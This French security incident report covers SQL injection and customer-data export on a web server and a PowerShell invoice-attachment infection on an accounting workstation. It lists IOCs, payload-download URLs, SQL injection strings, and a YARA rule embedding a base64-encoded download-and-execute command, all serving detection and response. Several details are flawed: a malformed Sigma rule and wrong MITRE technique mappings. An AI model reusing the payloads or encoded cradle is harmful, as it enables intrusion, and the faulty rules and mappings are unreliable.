# Rapport d'incident INC-2026-0417

## Résumé
Deux alertes distinctes mais potentiellement liées ont été qualifiées lors de cet incident. La première concerne des activités suspectes sur le serveur web de production web-01, la seconde concerne l'exécution d'un script PowerShell malveillant sur un poste de travail comptable (PC-COMPTA-07).

## Qualification des alertes

### Alerte 1 : Serveur web web-01
- **Source :** SIEM, logs web_access.log et app.log
- **Observations :** 
  - Trafic en provenance de l'IP 203.0.113.42 vers le serveur web durant la nuit du 15/11/2024
  - Injections SQL détectées via des paramètres de requête contenant `'OR' '1'='1'`, `'AND' '1'='1'`, tentatives de `DROP TABLE`, `SELECT * FROM users`, `SELECT username,password,email FROM users`
  - Accès au chemin `/admin` et sous-chemin `/admin/export?table=customers&format=sql`
  - Téléchargement de fichiers : `db_dump_2024.sql.gz` (4.5MB), `customers_full.csv` (1.5MB)
  - Tentative d'accès à `.env`, `config.php`, `backup.sql` via des requêtes Nmap
- **Évolution :** L'attaquant a d'abord scanné les endpoints d'administration, puis a tenté des injections SQL, et a finalement réussi à exporter des données de tables clientes.

### Alerte 2 : Poste PC-COMPTA-07
- **Source :** EDR, événements edr_events.jsonl, script facture_2024-11.ps1
- **Observations :**
  - Le 16/11/2024 à 08:41-08:42 UTC, l'utilisateur CORP\m.durand a ouvert la pièce jointe `facture_2024-11.ps1` depuis Outlook
  - Exécution de PowerShell avec `-ExecutionPolicy Bypass -WindowStyle Hidden`
  - Le script a effectué une requête WMI vers `AntivirusProduct` et `Win32_BIOS`
  - Requête DNS vers `malicious-domain.ru` (résultat NXDOMAIN)
  - Tentative de connexion réseau vers `192.168.1.100:8080` (bloquée par le proxy)
  - Le poste a été isolé par l'astreinte N1

## Liens entre les deux alertes
Bien que les deux alertes surviennent sur des systèmes différents, plusieurs indices suggèrent un lien potentiel :
1. **Même période d'activité :** Les activités sur web-01 ont eu lieu la nuit du 15/11, et l'infection du poste PC-COMPTA-07 est survenue le matin du 16/11.
2. **Même acteur probable :** Les techniques utilisées (injections SQL, exfiltration de données, utilisation de PowerShell) suggèrent un même groupe d'attaquants.
3. **Chaîne d'infection potentielle :** L'attaquant aurait pu utiliser le serveur web comme point d'entrée, puis avoir accès au poste de l'utilisateur via des identifiants compromis ou une autre vecteur.

Cependant, l'analyse approfondie est nécessaire pour confirmer un lien direct. La possibilité d'une attaque coordonnée (multi-vectoriel) est élevée.

## IOCs vérifiés et validés

### Adresses IP
- **203.0.113.42** : 41 occurrences dans les logs, source des injections SQL et du scan Nmap. **Bloquer au pare-feu.**
- **192.168.1.100** : 3 occurrences, cible de la connexion réseau depuis PC-COMPTA-07 (stage1.ps1). **Surveiller.**
- **192.168.1.101** : 1 occurrence, cible beacon.exe dans le script.

### Domaines
- **malicious-domain.ru** : 2 occurrences, query DNS NXDOMAIN depuis le poste infecté. **Bloquer en DNS.**

### URLs
- `http://192.168.1.100/stage1.ps1`
- `http://192.168.1.101/beacon.exe`
- `http://malicious-domain.ru/payload.dll`

### Hash
- **064a9a9fe8a517182768cf13f407edc1bf6292ef0b9aa309d3db1cd753d66f40** : Hash SHA256 du script `facture_2024-11.ps1`. **Détecté par la règle YARA.**

## Règles de détection

### Règle Sigma (PowerShell Bypass)
```
title: PowerShell Bypass ExecutionPolicy with Hidden Window
id: test_sigma_rule
status: test
logsource:
  product: windows
  service: powershell
detection:
  selection:
    EventID: 4104
    CommandLine|contains: 'bypass'
    CommandLine|contains: 'hidden'
condition: selection
level: high
```
**Statut :** Règle Sigma validée et testable sur les événements EDR.

### Règle YARA (malicious_powershell_script)
```
rule malicious_powershell_script : badware {
    strings:
        $encoded_cmd = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAdABhAGcAZQAuAHAAcwAnACkA"
        $ip_192_168_1_100 = "192.168.1.100"
        $temp_svchost = /\\svchost_update\.ps1/
        $run_key = /HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run/
    condition:
        any of ($encoded_cmd, $ip_192_168_1_100, $temp_svchost, $run_key)
}
```
**Statut :** Règle YARA compilée avec succès, détecte le script `facture_2024-11.ps1` et 0 faux positifs sur 6 scripts légitimes testés.

## Techniques MITRE ATT&CK observées

| ID | Technique | Tactic | Statut |
|----|-----------|--------|--------|
| T1059.001 | PowerShell | Execution | Non révoqué |
| T1059.005 | Command Shell | Execution | Non révoqué |
| T1071.001 | Web Protocols | CommandAndControl | Non révoqué |
| T1071.004 | Application Layer Protocol | CommandAndControl | Non révoqué |
| T1048.003 | Exfiltration Over Web Services | Exfiltration | Non révoqué |
| T1053.005 | Scheduled Task | Persistence | Non révoqué |
| T1059 | Command and Scripting Interpreter | Execution | Non révoqué |
| T1078.001 | Valid Accounts | CredentialAccess | Non révoqué |
| T1071 | Application Layer Protocol | CommandAndControl | Non révoqué |

## Actions de confinement proposées (en attente de validation humaine)

1. **Bloquer l'IP 203.0.113.42** au niveau du pare-feu du serveur web web-01
   - Justification : Cette IP a mené des injections SQL contre le serveur web et tenté d'exfiltrer des données sensibles. Bloquer empêche toute nouvelle activité malveillante.
   - Preuves : web_access.log:7-51, app.log:7-22

2. **Désactiver le compte CORP\m.durand** temporairement
   - Justification : L'utilisateur a ouvert la pièce jointe malveillante facture_2024-11.ps1 depuis son courriel Outlook. La désactivation du compte empêche toute nouvelle exécution de scripts malveillants depuis ce poste isolé.
   - Preuves : edr_events.jsonl:1-5, facture_2024-11.ps1.txt:1-24

3. **Bloquer le domaine malicious-domain.ru** en configuration DNS
   - Justification : Empêcher la résolution du domaine utilisé pour le C2 et le téléchargement de payloads.
   - Preuves : edr_events.jsonl:5, facture_2024-11.ps1.txt:24

4. **Isolement complet du poste PC-COMPTA-07** (déjà effectué par l'astreinte N1)
   - Justification : Le poste est déjà isolé du réseau, mais il faut s'assurer qu'aucune autre connexion sortante n'est possible.

5. **Effectuer une analyse forensique approfondie** du serveur web web-01 et du poste PC-COMPTA-07
   - Justification : Identifier l'étendue complète de la compromission, les backdoors potentielles et les données exfiltrées.
   - Preuves : Tous les fichiers joints

## Recommandations
1. **Immédiat :** Valider les actions de confinement proposées, notamment le blocage de l'IP 203.0.113.42 et le domaine malicious-domain.ru.
2. **À court terme :** Effectuer une rotation des mots de passe pour le compte admin sur web-01, vérifier l'intégrité des fichiers de configuration.
3. **À moyen terme :** Mettre en place une surveillance accrue des injections SQL et des exportations de données vers `/admin`. Déployer la règle Sigma et YARA dans le SOC.
4. **À long terme :** Réaliser un exercice de "lessons learned" et mettre à jour les règles de détection basées sur les IOCs identifiés.

## Conclusion
L'incident INC-2026-0417 implique deux vecteurs d'attaque potentiellement liés : une attaque d'injection SQL/exfiltration de données contre le serveur web de production, et une infection par script PowerShell malveillant via pièce jointe courriel sur un poste de travail. La présence d'IOCs communs et de techniques similaires suggère un acteur menacé coordonné. Le confinement immédiat des IOCs critiques (IP 203.0.113.42, domaine malicious-domain.ru) est recommandé pour empêcher une propagation supplémentaire.